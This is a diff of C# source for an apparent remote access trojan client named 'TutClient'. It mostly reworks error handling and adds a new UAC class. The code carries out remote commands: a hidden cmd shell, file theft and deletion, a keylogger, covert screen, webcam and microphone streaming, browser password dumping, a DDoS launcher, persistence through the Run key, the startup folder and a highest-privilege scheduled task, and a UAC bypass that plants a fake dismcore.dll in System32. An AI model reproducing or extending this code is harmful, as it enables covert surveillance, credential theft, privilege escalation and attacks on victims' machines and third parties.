-                if (text.StartsWith("t2s|")) //changed spelling mistake here it was ts2
-                {
-                    String txt = text.Split('|')[1];
-                    t2s(txt);
-                }
-
-                if (text.StartsWith("cd|"))
-                {
-                    String opt = text.Split('|')[1];
-
-                    if (opt == "open")
-                    {
-                        mciSendStringA("set CDAudio door open", "", 127, 0);
-                    }
-                    else
-                    {
-                        mciSendStringA("set CDAudio door closed", "", 127, 0);
-                    }
-                }
-
-                if (text.StartsWith("emt|"))
-                {
-                    String action = text.Split('|')[1];
-                    String element = text.Split('|')[2];
-
-                    switch (element)
-                    {
-                        case "task":
-
-                            if (action == "hide")
-                            {
-                                hTaskBar();
-                            }
-                            else
-                            {
-                                sTaskBar();
-                            }
-
-                            break;
-
-                        case "clock":
-
-                            if (action == "hide")
-                            {
-                                hClock();
-                            }
-                            else
-                            {
-                                sClock();
-                            }
-
-                            break;
-
-                        case "tray":
-
-                            if (action == "hide")
-                            {
-                                hTrayIcons();
-                            }
-                            else
-                            {
-                                sTrayIcons();
-                            }
-
-                            break;
-
-                        case "desktop":
-
-                            if (action == "hide")
-                            {
-                                hDesktop();
-                            }
-                            else
-                            {
-                                sDesktop();
-                            }
-
-                            break;
-
-                        case "start":
-
-                            if (action == "hide")
-                            {
-                                hStart();
-                            }
-                            else
-                            {
-                                sStart();
-                            }
-
-                            break;
-                    }
-                }
-
-                if (text == "proclist")
-                {
-                    Process[] allProcess = Process.GetProcesses();
-                    String dataString = "";
-
-                    foreach (Process proc in allProcess)
-                    {
-                        String name = proc.ProcessName;
-                        String id = proc.Id.ToString();
-                        String responding = proc.Responding.ToString();
-                        String title = proc.MainWindowTitle;
-                        String priority = "N/A";
-                        String path = "N/A";
-
-                        if (title == "") title = "N/A";
-
-                        try
-                        {
-                            priority = proc.PriorityClass.ToString();
-                            path = proc.Modules[0].FileName;
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine("List error: " + e.Message);
-                        }
-
-                        String pdata = "setproc|" + name + "|" + responding + "|" + title + "|" + priority + "|" + path + "|" + id;
-                        dataString += pdata + "\n";
-
-                        //sendCommand(pdata);
-                        //System.Threading.Thread.Sleep(100);
-                    }
-
-                    sendCommand(dataString);
-                }
-
-                if (text.StartsWith("prockill"))
-                {
-                    String id = text.Split('|')[1];
-                    try
-                    {
-                        Process.GetProcessById(int.Parse(id)).Kill();
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e.Message);
-                        reportError(errorType.PROCESS_ACCESS_DENIED, "Can't kill process", "Manager failed to kill process: " + id);
-                    }
-                }
-
-                if (text.StartsWith("procstart"))
-                {
-                    String file = text.Split('|')[1];
-                    String state = text.Split('|')[2];
-
-                    Process p = new Process();
-
-                    switch (state)
-                    {
-                        case "Normal":
-                            p.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
-                            break;
-
-                        case "Hidden":
-                            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                            break;
-                    }
-
-                    p.StartInfo.FileName = file;
-                    p.Start();
-                }
-
-                if (text == "startcmd")
-                {
-                    ProcessStartInfo info = new ProcessStartInfo();
-
-                    info.FileName = "cmd.exe";
-                    info.CreateNoWindow = true;
-                    info.UseShellExecute = false;
-                    info.RedirectStandardInput = true;
-                    info.RedirectStandardOutput = true;
-                    info.RedirectStandardError = true;
-
-                    Process p = new Process();
-
-                    p.StartInfo = info;
-                    p.Start();
-                    cmdProcess = p;
-                    toShell = p.StandardInput;
-                    fromShell = p.StandardOutput;
-                    error = p.StandardError;
-                    toShell.AutoFlush = true;
-
-                    System.Threading.Thread shellTherad = new System.Threading.Thread(new System.Threading.ThreadStart(getShellInput));
-                    shellTherad.Start();
-                }
-
-                if (text == "stopcmd")
-                {
-                    cmdProcess.Kill();
-                    toShell.Dispose();
-                    toShell = null;
-                    fromShell.Dispose();
-                    fromShell = null;
-                    cmdProcess.Dispose();
-                    cmdProcess = null;
-                }
-
-                if (text.StartsWith("cmd§"))
-                {
-                    string command = text.Split('§')[1];
-                    toShell.WriteLine(command + "\r\n");
-                }
-
-                if (text == "fdrive")
-                {
-                    DriveInfo[] drives = DriveInfo.GetDrives();
-
-                    String info = "";
-
-                    foreach (DriveInfo d in drives)
-                    {
-                        if (d.IsReady)
-                        {
-                            info += d.Name + "|" + d.TotalSize + "\n";
-                        }
-                        else
-                        {
-                            info += d.Name + "\n";
-                        }
-                    }
-
-                    String resp = "fdrivel§" + info;
-                    sendCommand(resp);
-                }
-
-                if (text.StartsWith("fdir§"))
-                {
-                    String path = text.Split('§')[1];
-                    Console.WriteLine(path);
-                    bool passed = false;
-                    if (path.Length == 3 && path.Contains(":\\"))
-                    {
-                        passed = true;
-                    }
-                    if (!passed && Directory.Exists(path))
-                    {
-                        passed = true;
-                    }
-                    if (!passed)
-                    {
-                        reportError(errorType.DIRECTORY_NOT_FOUND, "Directory not found", "Manager can't locate: " + path);
-                        return;
-                    }
-                    Console.WriteLine("Valid = true");
-                    String[] directories = Directory.GetDirectories(path);
-                    String[] files = Directory.GetFiles(path);
-                    List<String> dir = new List<String>();
-                    List<String> file = new List<String>();
-                    String fi = "";
-                    String di = "";
-
-                    foreach (String d in directories)
-                    {
-                        String size = "N/A";
-                        String name = d.Replace(path, "");
-                        String crtime = Directory.GetCreationTime(d).ToString();
-                        String pth = d;
-                        String cont = name + "§" + size + "§" + crtime + "§" + pth;
-                        dir.Add(cont);
-                    }
-
-                    foreach (String f in files)
-                    {
-                        String size = new FileInfo(f).Length.ToString();
-                        String name = Path.GetFileName(f);
-                        String crtime = File.GetCreationTime(f).ToString();
-                        String pth = f;
-                        String cont = name + "§" + size + "§" + crtime + "§" + pth;
-                        file.Add(cont);
-                    }
-
-                    foreach (String c in dir)
-                    {
-                        di += c + "\n";
-                    }
-
-                    foreach (String f in file)
-                    {
-                        fi += f + "\n";
-                    }
-
-                    String final = di + fi;
-                    sendCommand("fdirl" + final);
-                }
-
-                if (text.StartsWith("f1§"))
-                {
-                    String current = text.Split('§')[1];
-                    Console.WriteLine(current);
-
-                    if (current.Length == 3 && current.Contains(":\\"))
-                    {
-                        sendCommand("f1§drive");
-                    }
-                    else
-                    {
-                        String parent = new DirectoryInfo(current).Parent.FullName;
-                        Console.WriteLine(parent);
-                        sendCommand("f1§" + parent);
-                    }
-                }
-
-                if (text.StartsWith("fpaste§"))
-                {
-                    String source = text.Split('§')[2];
-                    String target = text.Split('§')[1];
-                    String mode = text.Split('§')[3];
-                    String sourceType = "file";
-                    if (!Directory.Exists(target))
-                    {
-                        reportError(errorType.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + target + " cannot be located by manager");
-                        return;
-                    }
-
-                    if (Directory.Exists(source)) sourceType = "dir";
-                    switch (sourceType)
-                    {
-                        case "dir":
-                            if (mode == "1")
-                            {
-                                //Copy Directory
-                                String name = new DirectoryInfo(source).Name;
-                                Directory.CreateDirectory(target + "\\" + name);
-                                DirectoryCopy(source, target + "\\" + name, true);
-                            }
-
-                            if (mode == "2")
-                            {
-                                //Move Directory
-                                String name = new DirectoryInfo(source).Name;
-                                Directory.CreateDirectory(target + "\\" + name);
-                                DirectoryMove(source, target + "\\" + name, true);
-                            }
-                            break;
-
-                        case "file":
-                            if (mode == "1")
-                            {
-                                //Copy File
-                                File.Copy(source, target + "\\" + new FileInfo(source).Name, true);
-                            }
-                            if (mode == "2")
-                            {
-                                //Move File
-                                File.Move(source, target + "\\" + new FileInfo(source).Name);
-                            }
-                            break;
-                    }
-                }
-
-                if (text.StartsWith("fexec§"))
-                {
-                    String path = text.Split('§')[1];
-                    bool valid = false;
-                    if (File.Exists(path)) valid = true;
-                    if (Directory.Exists(path)) valid = true;
-                    if (!valid)
-                    {
-                        reportError(errorType.FILE_NOT_FOUND, "Can't execute " + path, "File cannot be located by manager");
-                        return;
-                    }
-                    Process.Start(path);
-                }
-
-                if (text.StartsWith("fhide§"))
-                {
-                    String path = text.Split('§')[1];
-                    bool valid = false;
-                    if (File.Exists(path)) valid = true;
-                    if (Directory.Exists(path)) valid = true;
-                    if (!valid)
-                    {
-                        reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
-                        return;
-                    }
-                    File.SetAttributes(path, FileAttributes.Hidden);
-                }
-
-                if (text.StartsWith("fshow§"))
-                {
-                    String path = text.Split('§')[1];
-                    bool valid = false;
-                    if (File.Exists(path)) valid = true;
-                    if (Directory.Exists(path)) valid = true;
-                    if (!valid)
-                    {
-                        reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
-                        return;
-                    }
-                    File.SetAttributes(path, FileAttributes.Normal);
-                }
-
-                if (text.StartsWith("fdel§"))
-                {
-                    String path = text.Split('§')[1];
-                    if (Directory.Exists(path))
-                    {
-                        Directory.Delete(path, true);
-                    }
-                    else if(File.Exists(path))
-                    {
-                        File.Delete(path);
-                    }
-                    else
-                    {
-                        reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cant delete entry!", "Manager failed to locate: " + path);
-                    }
-                }
-
-                if (text.StartsWith("frename§"))
-                {
-                    String path = text.Split('§')[1];
-                    String name = text.Split('§')[2];
-                    bool isDir = false;
-                    String target = "";
-                    if (Directory.Exists(path)) isDir = true;
-                    if (isDir)
-                    {
-                        target = new DirectoryInfo(path).Parent.FullName + "\\" + name;
-                        Directory.Move(path, target);
-                    }
-                    else
-                    {
-                        if (!File.Exists(path))
-                        {
-                            reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Can't rename entry!", "Manager failed to locate: " + path);
-                            return;
-                        }
-                        target = new FileInfo(path).Directory.FullName + "\\" + name;
-                        File.Move(path, target);
-                    }
-                }
-
-                if (text.StartsWith("ffile§"))
-                {
-                    String path = text.Split('§')[1];
-                    String name = text.Split('§')[2];
-                    String fullPath = path + "\\" + name;
-
-                    //Overwrite existing
-                    if (File.Exists(path)) File.Delete(path);
-
-                    using (FileStream fs = File.Create(fullPath))
-                    {
-                        Byte[] info = new UTF8Encoding(true).GetBytes("");
-                        // Add some information to the file.
-                        fs.Write(info, 0, info.Length);
-                    }
-                }
-                if (text.StartsWith("fndir§"))
-                {
-                    String path = text.Split('§')[1];
-                    String name = text.Split('§')[2];
-                    String fullPath = path + "\\" + name;
-                    //Overwrite existing
-                    if (Directory.Exists(path)) Directory.Delete(path, true);
-
-                    Directory.CreateDirectory(fullPath);
-                }
-                if (text.StartsWith("getfile§"))
-                {
-                    String path = text.Split('§')[1];
-                    if (!File.Exists(path))
-                    {
-                        reportError(errorType.FILE_NOT_FOUND, "Can't open file", "Manager failed to locate: " + path);
-                        return;
-                    }
-                    String content = File.ReadAllText(path);
-                    String back = "backfile§" + content;
-                    sendCommand(back);
-                }
-                if (text.StartsWith("putfile§"))
-                {
-                    String path = text.Split('§')[1];
-                    String content = text.Split('§')[2];
-
-                    if (!File.Exists(path))
-                    {
-                        reportError(errorType.FILE_NOT_FOUND, "Can't save file!", "Manager failed to locate: " + path);
-                        return;
-                    }
-                    File.WriteAllText(path, content);
-                }
-                if (text.StartsWith("fup"))
-                {
-                    String location = text.Split('§')[1];
-                    if (File.Exists(location)) //prev. !File.Exists(location) -> bug
-                    {
-                        reportError(errorType.FILE_EXISTS, "Can't upload file!", "Manager detected that this file exists!");
-                        return;
-                    }
-                    int size = int.Parse(text.Split('§')[2]);
-                    fup_location = location;
-                    fup_size = size;
-                    isFileDownload = true;
-                    recvFile = new byte[fup_size];
-                    sendCommand("fconfirm");
-                }
-                if (text.StartsWith("fdl§"))
-                {
-                    String file = text.Split('§')[1];
-                    if (!File.Exists(file))
-                    {
-                        reportError(errorType.FILE_NOT_FOUND, "Can't download file!", "Manager is unable to locate: " + file);
-                        return;
-                    }
-                    String size = new FileInfo(file).Length.ToString();
-                    fdl_location = file;
-                    sendCommand("finfo§" + size);
-                }
-                if (text == "fconfirm")
-                {
-                    Byte[] sendFile = File.ReadAllBytes(fdl_location);
-                    sendByte(sendFile);
-                }
-                if (text == "dc")
-                {
-                    Thread.Sleep(3000);
-                    isDisconnect = true;
-                }
-                if (text == "sklog")
-                {
-                    if (!isKlThreadRunning)
-                    {
-                        Thread t = new Thread(new ThreadStart(Keylogger.Logger));
-                        t.Start();
-                        isKlThreadRunning = true;
-                    }
-                    if (isKlThreadRunning && !Keylogger.letRun)
-                    {
-                        Keylogger.letRun = true;
-                    }
-
-                }
-                if (text == "stklog")
-                {
-                    if (isKlThreadRunning && Keylogger.letRun) Keylogger.letRun = false;
-                }
-                if (text == "rklog")
-                {
-                    String dump = Keylogger.KeyLog;
-                    sendCommand("putklog" + dump);
-                }
-                if (text == "cklog")
-                {
-                    Keylogger.LastWindow = "";
-                    Keylogger.KeyLog = "";
-                }
-                if (text == "rdstart")
-                {
-                    Thread rd = new Thread(new ThreadStart(RDesktop.StreamScreen));
-                    RDesktop.isShutdown = false;
-                    rd.Start();
-                }
-                if (text == "rdstop")
-                {
-                    RDesktop.isShutdown = true;
-                }
-                if (text.StartsWith("rmove-"))
-                {
-                    string[] t = text.Split('-');
-                    string[] x = t[1].Split(':');
-                    Cursor.Position = new System.Drawing.Point(int.Parse(x[0]), int.Parse(x[1]));
-                }
-                if (text.StartsWith("rtype-"))
-                {
-                    //Console.WriteLine("received write command");
-                    string[] t = text.Split('-');
-                    if (t[1] != "rtype")
-                    {
-                        SendKeys.SendWait(t[1]);
-                    }
-
-                }
-                if (text.StartsWith("rclick-"))
-                {
-                    string[] t = text.Split('-');
-                    MouseEvent(t[1], t[2]);
-                    //Cursor.Position = new System.Drawing.Point(729, 182);
-                }
-                if (text == "alist")
-                {
-                    List<NAudio.Wave.WaveInCapabilities> source = new List<NAudio.Wave.WaveInCapabilities>();
-                    String send = "";
-
-                    for (int i = 0; i < NAudio.Wave.WaveIn.DeviceCount; i++)
-                    {
-                        source.Add(NAudio.Wave.WaveIn.GetCapabilities(i));
-                    }
-
-                    foreach (var src in source)
-                    {
-                        send += src.ProductName + "|" + src.Channels.ToString() + "§";
-                    }
-
-                    send = send.Substring(0, send.Length - 1);
-                    send = "alist" + send;
-                    sendCommand(send);
-                }
-
-                if (text.StartsWith("astream"))
-                {
-                    try
-                    {
-                        String devNum = text.Split('§')[1];
-                        int deviceNumber = int.Parse(devNum);
-                        NAudio.Wave.WaveInEvent audioSource = new NAudio.Wave.WaveInEvent();
-                        audioSource.DeviceNumber = deviceNumber;
-                        audioSource.WaveFormat = new NAudio.Wave.WaveFormat(44100, NAudio.Wave.WaveIn.GetCapabilities(deviceNumber).Channels);
-                        audioSource.DataAvailable += new EventHandler<NAudio.Wave.WaveInEventArgs>(sendAudio);
-                        streaming = audioSource;
-                        audioSource.StartRecording();
-                    }
-                    catch (Exception)
-                    {
-                        reportError(errorType.DEVICE_NOT_AVAILABLE, "Can't stream microphone!", "Selected Device is not available!");
-                    }
-                }
-                if (text == "astop")
-                {
-                    streaming.StopRecording();
-                    streaming.Dispose();
-                    streaming = null;
-                }
-                if (text == "wlist")
-                {
-                    string captureDevices = "";
-                    FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                    int i = 0;
-
-                    foreach (FilterInfo device in devices)
-                    {
-                        captureDevices += i.ToString() + "|" + device.Name + "§";
-                        i++;
-                    }
-
-                    if (captureDevices != "") captureDevices = captureDevices.Substring(0, captureDevices.Length - 1); //remove the split char ('§') from the end
-                    sendCommand("wlist" + captureDevices);
-                }
-                if (text.StartsWith("wstream"))
-                {
-                    int id = int.Parse(text.Split('§')[1]);
-
-                    FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                    if (devices.Count == 0)
-                    {
-                        reportError(errorType.DEVICE_NOT_AVAILABLE, "Can't stream webcam!", "The selected device is not found!");
-                        return;
-                    }
-                    int i = 0;
-                    FilterInfo dName = new FilterInfo("");
-
-                    foreach (FilterInfo device in devices)
-                    {
-                        if (i == id)
-                        {
-                            dName = device;
-                        }
-                        i++;
-                    }
-
-                    Console.WriteLine(dName.Name);
-
-                    source = new VideoCaptureDevice(dName.MonikerString);
-                    source.NewFrame += new NewFrameEventHandler(source_NewFrame);
-                    source.Start();
-                }
-                if (text == "wstop")
-                {
-                    source.Stop();
-                    source = null;
-                }
-                if (text.StartsWith("ddosr"))
-                {
-                    String[] p = text.Split('|');
-                    String ip = p[1];
-                    String port = p[2];
-                    String protocol = p[3];
-                    String packetSize = p[4];
-                    String threads = p[5];
-                    String delay = p[6];
-
-                    DDoS = new ddos(ip, port, protocol, packetSize, threads, delay);
-                    DDoS.startDdos();
-                }
-
-                if (text.StartsWith("ddosk"))
-                {
-                    DDoS.stopDdos();
-                }
-
-                if (text == "getpw")
-                {
-                    bool validOperation = true;
-                    String app = Application.StartupPath;
-                    if (!File.Exists(app + "\\ff.exe"))
-                    {
-                        validOperation = false;
-                    }
-
-                    if (validOperation)
-                    {
-                        passwordManager pm = new passwordManager();
-                        String[] passwd = pm.getSavedPassword();
-                        String gcpw = "gcpw\n" + passwd[0];
-                        String iepw = "iepw\n" + passwd[1];
-                        String ffpw = "ffpw\n" + passwd[2];
-                        sendCommand(iepw);
-                        Console.WriteLine("iepw sent");
-                        Thread.Sleep(1000);
-                        sendCommand(gcpw);
-                        Console.WriteLine("gcpw sent");
-                        Thread.Sleep(1000);
-                        sendCommand(ffpw);
-                        Console.WriteLine("ffpw sent");
-                        pm = null;
-                        gcpw = null;
-                        iepw = null;
-                        ffpw = null;
-                        return;
-                    }
-                    else
-                    {
-                        sendCommand("getpwu");
-                        reportError(errorType.PASSWORD_RECOVERY_FAILED, "Can't recover passwords!", "ff.exe (PasswordFox) is missing!");
-                        /*if (isgetpwu) return;
-                        sendCommand("getpwu");
-                        isgetpwu = true;
-                        WebClient wc = new WebClient();
-                        wc.DownloadFile("http://www.nirsoft.net/toolsdownload/passwordfox.zip", app + "\\ffcp.zip");
-                        System.IO.Compression.ZipFile.ExtractToDirectory(app + "\\ffcp.zip", app + "\\ffex");
-                        System.IO.File.Copy(app + "\\ffex\\PasswordFox.exe", app + "\\ff.exe");
-                        System.IO.Directory.Delete(app + "\\ffex");
-                        System.IO.File.Delete(app + "\\ffcp.zip");
-                        isgetpwu = false;*/
-                    }
-                }
-
-                if (text == "getstart")
-                {
-                    String app = Application.StartupPath;
-                    sendCommand("setstart§" + app);
-                }
+                Console.WriteLine(ex.Message);
+                RDesktop.isShutdown = true;
+                Console.WriteLine("Connection ended");
             }
         }
-            catch (Exception ex)
-             {
-                //added this try catch after it crashed when server closed without sending disconnect
-                Console.WriteLine(ex.Message);  
-                RDesktop.isShutdown = true;
-                 Console.WriteLine("Connection Ended");
-            }
 
         private static void source_NewFrame(object sender, NewFrameEventArgs e)
         {
-             try //added a try catch as tcp puts this into a loop if server shutsdown rapidly and crashes
+            try
             {
-                 
-            System.Drawing.Bitmap cam = (System.Drawing.Bitmap)e.Frame.Clone();
+                System.Drawing.Bitmap cam = (System.Drawing.Bitmap)e.Frame.Clone();
 
-            System.Drawing.ImageConverter convert = new System.Drawing.ImageConverter();
-            byte[] camBuffer = (byte[])convert.ConvertTo(cam, typeof(Byte[]));
-            byte[] send = new byte[camBuffer.Length + 16];
-            byte[] header = Encoding.Unicode.GetBytes("wcstream");
-            Buffer.BlockCopy(header, 0, send, 0, header.Length);
-            Buffer.BlockCopy(camBuffer, 0, send, header.Length, camBuffer.Length);
-            Console.WriteLine("Size of send: " + send.Length);
-            _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
-            Application.DoEvents();
-            Thread.Sleep(500);
-            cam.Dispose();
-             }
-             catch
+                System.Drawing.ImageConverter convert = new System.Drawing.ImageConverter();
+                byte[] camBuffer = (byte[])convert.ConvertTo(cam, typeof(Byte[]));
+                byte[] send = new byte[camBuffer.Length + 16];
+                byte[] header = Encoding.Unicode.GetBytes("wcstream");
+                Buffer.BlockCopy(header, 0, send, 0, header.Length);
+                Buffer.BlockCopy(camBuffer, 0, send, header.Length, camBuffer.Length);
+                Console.WriteLine("Size of send: " + send.Length);
+                _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
+                Application.DoEvents();
+                Thread.Sleep(200); //this was 500
+                cam.Dispose();
+            }
+            catch (Exception)
             {
-                try//try to disconnect if connection lost during send otherwise critical error
+                try
                 {
                     Console.WriteLine("Connection Ended");
-                    Thread.Sleep(3000); 
+                    Thread.Sleep(3000);
                     isDisconnect = true;
-                  
+                    
                 }
-                   
-                catch (Exception exc)//we should never get here but incase we do restart the application
+                catch (Exception exc)
                 {
-                  
+                    
                     Console.WriteLine("Failed to send New Frame  original ERROR : " + exc.Message);
                     Thread.Sleep(10000);
                     Application.Restart();
                     return;
                 }
-
             }
         }
 
@@ -1149,38 +1341,36 @@ namespace TutClient
 
         public static void SendScreen(byte[] img)
         {
-            try //added a try catch as tcp puts this into a loop if server shutsdown rapidly and crashes
+            try
             {
-            Console.WriteLine("Size of the image: " + img.Length);
-            byte[] send = new byte[img.Length + 16];
-            byte[] header = Encoding.Unicode.GetBytes("rdstream");
-            Buffer.BlockCopy(header, 0, send, 0, header.Length);
-            Buffer.BlockCopy(img, 0, send, header.Length, img.Length);
-            Console.WriteLine("Size of send: " + send.Length);
-            _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
+                Console.WriteLine("Size of the image: " + img.Length);
+                byte[] send = new byte[img.Length + 16];
+                byte[] header = Encoding.Unicode.GetBytes("rdstream");
+                Buffer.BlockCopy(header, 0, send, 0, header.Length);
+                Buffer.BlockCopy(img, 0, send, header.Length, img.Length);
+                Console.WriteLine("Size of send: " + send.Length);
+                _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
             }
-              catch 
+            catch (Exception)
             {
                 try
                 {
-                    Console.WriteLine("Connection Ended"); //try to disconnect if connection lost during send otherwise critical error
-                    Thread.Sleep(3000); 
+                    Console.WriteLine("Connection Ended");
+                    Thread.Sleep(3000);
                     isDisconnect = true;
-                   
-                }
-                   catch (Exception e) //we should never get here but incase we do restart the application
-                {
-                  
-                    Console.WriteLine("Failed To send Screen  original ERROR : " + e.Message);
-                    Thread.Sleep(10000);
-                    Application.Restart();
 
                 }
+                catch (Exception exc)
+                {
+
+                    Console.WriteLine("Failed to send Screen  original ERROR : " + exc.Message);
+                    Thread.Sleep(10000);
+                    Application.Restart();
+                    return;
+                }
             }
-                
-            
         }
-         //changed this as it is more reliable method to capture mouse movements
+
         private static void MouseEvent(string button, string direction)
         {
             int X = Cursor.Position.X;
@@ -1191,13 +1381,13 @@ namespace TutClient
                 case "left":
                     if (direction == "up")
                     {
-                         mouse_eventLeftUP(MouseEventFlags.LEFTUP, X, Y, 0, 0);
+                        mouse_eventLeftUP(MouseEventFlags.LEFTUP, X, Y, 0, 0);
                         Console.WriteLine("mouseevent leftup");
                     }
 
                     else
                     {
-                       mouse_eventLefteDown(MouseEventFlags.LEFTDOWN, X, Y, 0, 0);
+                        mouse_eventLeftDown(MouseEventFlags.LEFTDOWN, X, Y, 0, 0);
                         Console.WriteLine("mouseevent leftdown");
                     }
 
@@ -1219,35 +1409,31 @@ namespace TutClient
                     break;
             }
         }
-            //added these methods to capture the mouse movement , its more reliable this way
-              private static void mouse_eventLeftUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
+
+        private static void mouse_eventLeftUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
         {
-           
             Cursor.Position = new Point(x, y);    
-            mouse_event((int)(MouseEventFlags.LEFTUP), 0, 0, 0, 0);
-          
+            mouse_event((int)(MouseEventFlags.LEFTUP), 0, 0, 0, 0);  
         }
-        private static void mouse_eventLefteDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
+
+        private static void mouse_eventLeftDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
         {
-          
             Cursor.Position = new Point(x, y);
             mouse_event((int)(MouseEventFlags.LEFTDOWN), 0, 0, 0, 0);
-         
+          
         }
+
         private static void mouse_eventRightUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
         {
-         
             Cursor.Position = new Point(x, y);
             mouse_event((int)(MouseEventFlags.RIGHTUP), 0, 0, 0, 0);
         }
+
         private static void mouse_eventRightDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
         {
-         
             Cursor.Position = new Point(x, y);
             mouse_event((int)(MouseEventFlags.RIGHTDOWN), 0, 0, 0, 0);
-        
         }
-
 
         private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
         {
@@ -1431,11 +1617,15 @@ namespace TutClient
 
         private static void t2s(string stext)
         {
-            System.Speech.Synthesis.SpeechSynthesizer speaker = new System.Speech.Synthesis.SpeechSynthesizer();
+            using (System.Speech.Synthesis.SpeechSynthesizer speech = new System.Speech.Synthesis.SpeechSynthesizer()) //---------use this instead
 
-            speaker.SetOutputToDefaultAudioDevice();
+            {
+                speech.SetOutputToDefaultAudioDevice();
 
-            speaker.Speak(stext);
+                speech.Speak(stext);
+                // speech.Speak("hello");
+
+            }
         }
 
         private static void generateFreq(int freq, int duration)
@@ -1568,7 +1758,7 @@ namespace TutClient
             {
                 string EncryptionKey = "MAKV2SPBNI99212"; //this is the secret encryption key  you want to hide dont show it to other guys
                 byte[] cipherBytes = Convert.FromBase64String(cipherText);
-                Console.WriteLine("Encrypted Cipher Text: " + cipherText);
+                //Console.WriteLine("Encrypted Cipher Text: " + cipherText);
                 using (Aes encryptor = Aes.Create())
                 {
                     Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
@@ -1606,8 +1796,17 @@ namespace TutClient
 
             String crypted = Encrypt(k);
             if (isCmd) crypted = k;
-            byte[] data = System.Text.Encoding.Unicode.GetBytes(crypted);
-            _clientSocket.Send(data);
+            byte[] data = Encoding.Unicode.GetBytes(crypted);
+            // _clientSocket.Send(data);
+            try
+            {
+                _clientSocket.Send(data);  //-added this as sometimes the tcp was not finished sending when it was asked to close the stream
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Send Command Failure " + ex.Message);
+                return;//added this too
+            }
         }
 
         private static void sendByte(byte[] data)
@@ -1617,7 +1816,129 @@ namespace TutClient
                 Console.WriteLine("Socket is not connected!");
                 return;
             }
-            _clientSocket.Send(data);
+            // _clientSocket.Send(data);
+            try
+            {
+                _clientSocket.Send(data);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Send Byte Failure " + ex.Message);
+                return;
+            }
+
+        }
+    }
+
+    public class UAC
+    {
+        public enum ProbeMethod
+        {
+            StartUpFolder,
+            Registry,
+            TaskScheduler
+        }
+
+        public void ProbeStart(ProbeMethod pm)
+        {
+            if (pm == ProbeMethod.StartUpFolder)
+            {
+                string suFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                File.Copy(Application.ExecutablePath, suFolder + "\\" + new FileInfo(Application.ExecutablePath).Name);
+            }
+            else if (pm == ProbeMethod.Registry)
+            {
+                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true);
+                if (key.GetValue("tut_client") != null) key.DeleteValue("tut_client", false);
+                key.SetValue("tut_client", Application.ExecutablePath);
+                key.Close();
+                key.Dispose();
+                key = null;
+            }
+            else if (pm == ProbeMethod.TaskScheduler)
+            {
+                Process deltask = new Process();
+                Process addtask = new Process();
+                deltask.StartInfo.FileName = "cmd.exe";
+                deltask.StartInfo.Arguments = "/c schtasks /Delete tut_client /F";
+                deltask.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                deltask.Start();
+                deltask.WaitForExit();
+                Console.WriteLine("Delete Task Completed");
+                addtask.StartInfo.FileName = "cmd.exe";
+                addtask.StartInfo.Arguments = "/c schtasks /Create /tn tut_client /tr \"" + Application.ExecutablePath + "\" /sc ONLOGON /rl HIGHEST";
+                addtask.Start();
+                addtask.WaitForExit();
+                Console.WriteLine("Task created sucessfully!");
+            }
+        }
+
+        public bool IsAdmin()
+        {
+            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+            var principal = new System.Security.Principal.WindowsPrincipal(identity);
+            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+        }
+
+        private bool Is64Bit()
+        {
+            return Environment.Is64BitOperatingSystem;
+        }
+
+        private void CloseInstance()
+        {
+            Process self = Process.GetCurrentProcess();
+            self.Kill();
+        }
+
+        public bool BypassUAC()
+        {
+            const string dismCoreDll = "dismcore.dll";
+            const string copyFile = "copyFile.exe";
+            const string unattendFile = "unattend.xml";
+            const string launcherFile = "launch.exe";
+
+            //Check core files
+
+            if (!File.Exists(dismCoreDll) || !File.Exists(copyFile) || !File.Exists(unattendFile) || !File.Exists(launcherFile))
+            {
+                Program.reportError(Program.errorType.FILE_NOT_FOUND, "UAC Bypass", "One or more of the core files not found, please upload them manually");
+                return false;
+            }
+
+            //Copy fake dismcore.dll into System32
+
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.FileName = Application.StartupPath + "\\" + copyFile;
+            startInfo.Arguments = "\"" + Application.StartupPath + "\\" + dismCoreDll + "\" C:\\Windows\\System32";
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Process elevatedCopy = new Process();
+            elevatedCopy.StartInfo = startInfo;
+            elevatedCopy.Start();
+            Console.WriteLine("Waiting for elevated copy to finish");
+            elevatedCopy.WaitForExit();
+            if (elevatedCopy.ExitCode != 0) Console.WriteLine("Error during elevated copy");
+
+            //Create a file pointing to the startup path (reference for the fake dll)
+
+            string tempFileLocation = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\clientlocationx12.txt";
+
